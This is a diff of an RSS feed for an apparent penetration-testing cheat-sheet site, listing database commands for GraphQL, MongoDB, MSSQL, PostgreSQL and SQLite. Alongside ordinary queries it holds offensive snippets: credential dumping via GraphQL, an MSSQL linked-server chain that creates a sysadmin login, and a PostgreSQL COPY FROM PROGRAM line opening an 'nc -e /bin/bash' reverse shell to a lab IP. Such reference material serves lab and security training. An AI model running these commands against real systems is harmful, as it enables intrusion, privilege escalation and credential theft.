@@ -26,7 +26,7 @@
       <link>https://tldrbins.github.io/graphql/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/graphql/</guid>
-      <description>Basic Commands # Get fields from schema curl -s 10.10.11.10:3000/graphql -H &amp;#34;Content-Type: application/json&amp;#34; -d &amp;#39;{&amp;#34;query&amp;#34;:&amp;#34;{__schema{queryType{name,fields{name,description}}}}&amp;#34;}&amp;#39; | jq . # Get types name curl -s 10.10.11.10:3000/graphql -H &amp;#34;Content-Type: application/json&amp;#34; -d &amp;#39;{&amp;#34;query&amp;#34;:&amp;#34;{__schema{types{name}}}&amp;#34;}&amp;#39; | jq . # Get fields of type (e.g. User) curl -s 10.10.11.10:3000/graphql -H &amp;#34;Content-Type: application/json&amp;#34; -d &amp;#39;{&amp;#34;query&amp;#34;:&amp;#34;{__type(name:\&amp;#34;User\&amp;#34;){name,fields{name}}}&amp;#34;}&amp;#39; | jq . # Dump data from type (e.g. User type with fields username and password) curl -s 10.10.11.10:3000/graphql -H &amp;#34;Content-Type: application/json&amp;#34; -d &amp;#39;{&amp;#34;query&amp;#34;:&amp;#34;{User{username,password}}&amp;#34;}&amp;#39; | jq .</description>
+      <description>Visualize Tool graphql-voyager&#xA;+---------------------------------------------------------------+ | 1. Change Schema -&amp;gt; Introspection -&amp;gt; Copy Introspection Query | | 2. Paste query | | 3. Display | +---------------------------------------------------------------+ Basic Commands # Get fields from schema curl -s 10.10.11.10:3000/graphql -H &amp;#34;Content-Type: application/json&amp;#34; -d &amp;#39;{&amp;#34;query&amp;#34;:&amp;#34;{__schema{queryType{name,fields{name,description}}}}&amp;#34;}&amp;#39; | jq . # Get types name curl -s 10.10.11.10:3000/graphql -H &amp;#34;Content-Type: application/json&amp;#34; -d &amp;#39;{&amp;#34;query&amp;#34;:&amp;#34;{__schema{types{name}}}&amp;#34;}&amp;#39; | jq . # Get fields of type (e.g. User) curl -s 10.10.11.10:3000/graphql -H &amp;#34;Content-Type: application/json&amp;#34; -d &amp;#39;{&amp;#34;query&amp;#34;:&amp;#34;{__type(name:\&amp;#34;User\&amp;#34;){name,fields{name}}}&amp;#34;}&amp;#39; | jq .</description>
     </item>
     <item>
       <title>Microsoft Access Database</title>
@@ -40,21 +40,28 @@
       <link>https://tldrbins.github.io/mongodb_general/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/mongodb_general/</guid>
-      <description> General Connect to Mongo Database mongo 10.10.11.10:27017 # Connect local with creds and specified database mongo -u user -p password db_name Basic Commands # Show all databases show dbs # Choose database use db_name # Show all collections show collections # Show all of the collection db.COLLECTION_NAME.find().pretty() # Insert entry into collections db.COLLECTION_NAME.insert({&amp;#34;key&amp;#34;: &amp;#34;value&amp;#34;}) </description>
+      <description> General Connect to Mongo Database mongo 10.10.11.10:27017 # Connect local with creds and specified database mongo -u user -p password db_name Basic Commands # Show all databases show dbs # Choose database use db_name # Show all collections show collections # Show all of the collection db.COLLECTION_NAME.find().pretty() # Insert entry into collections db.COLLECTION_NAME.insert({&amp;#34;key&amp;#34;: &amp;#34;value&amp;#34;}) # Update an entry (e.g. password of user) db.COLLECTION_NAME.update({&amp;#34;username&amp;#34;: &amp;#34;user&amp;#34;}, {$set: {&amp;#34;password&amp;#34;: &amp;#34;password&amp;#34;}}); </description>
+    </item>
+    <item>
+      <title>MSSQL Agent Jobs</title>
+      <link>https://tldrbins.github.io/mssql_agent_jobs/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/mssql_agent_jobs/</guid>
+      <description>1. Pre-check # List principals SELECT name FROM sys.database_principals; # Check privilege over a principal from current user SELECT entity_name, permission_name FROM fn_my_permissions(&amp;#39;&amp;lt;PRINCIPAL&amp;gt;&amp;#39;, &amp;#39;USER&amp;#39;); # Fix : Cannot resolve the collation conflict between &amp;#34;Latin1_General_CI_AI&amp;#34; and &amp;#34;SQL_Latin1_General_CP1_CI_AS&amp;#34; SELECT entity_name collate DATABASE_DEFAULT,permission_name collate DATABASE_DEFAULT FROM fn_my_permissions(&amp;#39;&amp;lt;PRINCIPAL&amp;gt;&amp;#39;, &amp;#39;USER&amp;#39;); # Check SQL credentials SELECT name, credential_identity FROM sys.credentials; 2. Check proxy account name and permissions # Create a table to store info CREATE TABLE proxies (subsystem_id INT PRIMARY KEY NOT NULL, subsystem_name varchar(255), proxy_id INT, proxy_name varchar(255)); # Insert proxy info into table EXECUTE AS LOGIN=&amp;#39;&amp;lt;PRINCIPAL&amp;gt;&amp;#39;; INSERT proxies EXEC msdb.</description>
     </item>
     <item>
       <title>MSSQL General</title>
       <link>https://tldrbins.github.io/mssql_general/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/mssql_general/</guid>
-      <description>General Connect to MSSQL DB impacket-mssqlclient -windows-auth username:password@10.10.11.10 Basic Commands # Check mssql version SELECT @@version; # Check users SELECT name FROM master..syslogins # Check users SELECT name FROM master..syslogins WHERE sysadmin = &amp;#39;1&amp;#39;; # Check privilege SELECT entity_name, permission_name FROM fn_my_permissions(NULL, &amp;#39;SERVER&amp;#39;); # Show databases SELECT name FROM master..sysdatabases; # Show current database SELECT DB_NAME(); # List tables and schema SELECT table_name,table_schema from db_name.INFORMATION_SCHEMA.TABLES; # Select all from table SELECT * from db_name.</description>
+      <description>General Connect to MSSQL DB (From Linux) impacket-mssqlclient &amp;#39;username:password@10.10.11.10&amp;#39; # Without TLS impacket-mssqlclient -windows-auth &amp;#39;username:password@10.10.11.10&amp;#39; Connect to MSSQL DB (From Windows) # With inline query sqlcmd -S localhost -U username -P password -d db_name -Q &amp;#34;SELECT @@version;&amp;#34; Basic Commands # Check mssql version SELECT @@version; # Check users SELECT name FROM master..syslogins # Check users SELECT name FROM master..syslogins WHERE sysadmin = &amp;#39;1&amp;#39;; # Check service name and the account authorized to control the service SELECT servicename, service_account FROM sys.</description>
     </item>
     <item>
       <title>MSSQL Linked Servers</title>
       <link>https://tldrbins.github.io/mssql_linked_server/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/mssql_linked_server/</guid>
-      <description>Linked Servers Basic Commands Hint: Use double &#39;&#39; to escape &#39; in mssql&#xA;# Show current server select @@servername # Show linked servers select srvname from sysservers; Execute Query between Linked Servers # Execute query from current server to linked server EXECUTE (&amp;#39;select @@version;&amp;#39;) at [LINKED_SERVER]; # Execute query from linked server to current server EXECUTE (&amp;#39;EXECUTE (&amp;#39;&amp;#39;SELECT entity_name, permission_name FROM fn_my_permissions(NULL, &amp;#39;&amp;#39;&amp;#39;&amp;#39;SERVER&amp;#39;&amp;#39;&amp;#39;&amp;#39;);&amp;#39;&amp;#39;) at [CURRENT_SERVER]&amp;#39;) at [LINKED_SERVER]; Privilege Escalation Create Admin User from Privilege Linked Server EXECUTE(&amp;#39;EXECUTE(&amp;#39;&amp;#39;CREATE LOGIN test WITH PASSWORD = &amp;#39;&amp;#39;&amp;#39;&amp;#39;Test1234!</description>
+      <description> Linked Servers Basic Commands Hint: Use double &#39;&#39; to escape &#39; in mssql&#xA;# Show current server select @@servername # Show linked servers select srvname from sysservers; Execute Query between Linked Servers # Execute query from current server to linked server EXECUTE (&amp;#39;select @@version;&amp;#39;) at [LINKED_SERVER]; # Execute query from linked server to current server EXECUTE (&amp;#39;EXECUTE (&amp;#39;&amp;#39;SELECT entity_name, permission_name FROM fn_my_permissions(NULL, &amp;#39;&amp;#39;&amp;#39;&amp;#39;SERVER&amp;#39;&amp;#39;&amp;#39;&amp;#39;);&amp;#39;&amp;#39;) at [CURRENT_SERVER]&amp;#39;) at [LINKED_SERVER]; Privilege Escalation Create Admin User from Privilege Linked Server EXECUTE(&amp;#39;EXECUTE(&amp;#39;&amp;#39;CREATE LOGIN test WITH PASSWORD = &amp;#39;&amp;#39;&amp;#39;&amp;#39;password&amp;#39;&amp;#39;&amp;#39;&amp;#39;;&amp;#39;&amp;#39;) AT [CURRENT_SERVER]&amp;#39;) AT [LINKED_SERVER] EXECUTE(&amp;#39;EXECUTE(&amp;#39;&amp;#39;EXEC sp_addsrvrolemember &amp;#39;&amp;#39;&amp;#39;&amp;#39;test&amp;#39;&amp;#39;&amp;#39;&amp;#39;, &amp;#39;&amp;#39;&amp;#39;&amp;#39;sysadmin&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;) AT [CURRENT_SERVER]&amp;#39;) AT [LINKED_SERVER] </description>
     </item>
     <item>
       <title>MSSQL Privilege Escalation</title>
@@ -89,7 +96,14 @@
       <link>https://tldrbins.github.io/postgresql/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/postgresql/</guid>
-      <description>General Connect to postgresql Database psql -h 127.0.0.1 -U user -p 5432 -d database Basic Commands # Show databases \list # Show tables in current database \dt # Dump data from table select * from table_name; # Insert data into table (e.g) insert into table_name (username, password, role) values (&amp;#39;user&amp;#39;, &amp;#39;password&amp;#39;, &amp;#39;admin&amp;#39;); # Exit \q RCE # Only superuser CREATE TABLE IF NOT EXISTS exec(string text); COPY exec FROM PROGRAM &amp;#39;nc -e /bin/bash 10.</description>
+      <description>General Connect to postgresql Database psql -h 127.0.0.1 -U user -p 5432 -d database psql postgresql://username:password@localhost:5432/db_name Basic Commands # Show databases \list # Use database \connect db_name # Show tables in current database \dt # Dump data from table select * from table_name; # Insert data into table (e.g) insert into table_name (username, password, role) values (&amp;#39;user&amp;#39;, &amp;#39;password&amp;#39;, &amp;#39;admin&amp;#39;); # Write text copy (select &amp;#39;test&amp;#39;) to &amp;#39;/var/lib/postgresql/.profile&amp;#39;; # Exit \q RCE # Only superuser CREATE TABLE IF NOT EXISTS exec(string text); COPY exec FROM PROGRAM &amp;#39;nc -e /bin/bash 10.</description>
+    </item>
+    <item>
+      <title>SQLite</title>
+      <link>https://tldrbins.github.io/sqlite/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/sqlite/</guid>
+      <description> General # Open a db sqlite3 sql.db # Show tables .tables # Show schema of a table .schema table_name # Show column headers .headers on # Dump data select * from table_name; </description>
     </item>
   </channel>
 </rss>
